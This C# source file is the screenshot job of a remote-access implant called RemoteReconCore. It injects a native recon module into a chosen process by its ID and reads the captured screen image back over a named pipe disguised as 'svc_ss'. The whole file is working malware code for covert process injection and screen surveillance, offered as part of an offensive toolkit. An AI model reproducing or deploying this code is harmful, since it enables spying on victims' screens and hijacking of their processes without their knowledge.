using System;
using System.Collections.Generic;
using System.IO.Pipes;
using ReflectiveInjector;
using System.IO;

namespace RemoteReconCore
{
    public class Screenshot : IJobs
    {
        private int targetPid;
        
        public Screenshot(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string>Run()
        {
            string image = "";
            //Inject the recon module for screenshot into the target process.
            byte[] screenshotMod = Agent.PatchRemoteReconNative("screenshot");
            Injector screenshot = new Injector(targetPid, screenshotMod);

#if DEBUG
            Console.WriteLine("Created screenshot object");
#endif
            if (!screenshot.Inject())
                return new KeyValuePair<int, string>(2, "Recon module injection failed.");
            else
            {
#if DEBUG
                Console.WriteLine("Attempting to connect to named pipe");
#endif

                try
                {
                    //Connect to the named pipe server and read the screen shot image.
                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);

                    client.Connect((1000 * Agent.sleep));
                    StreamReader reader = new StreamReader(client);
                    image = reader.ReadLine();

                    client.Close();
                    client.Dispose();
#if DEBUG
                    Console.WriteLine("Writing result");
#endif
                    return new KeyValuePair<int, string>(0, image);
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Connect to namedpipe failed");
#endif
                    return new KeyValuePair<int, string>(2, e.ToString());
                }
            }
        }
    }
}
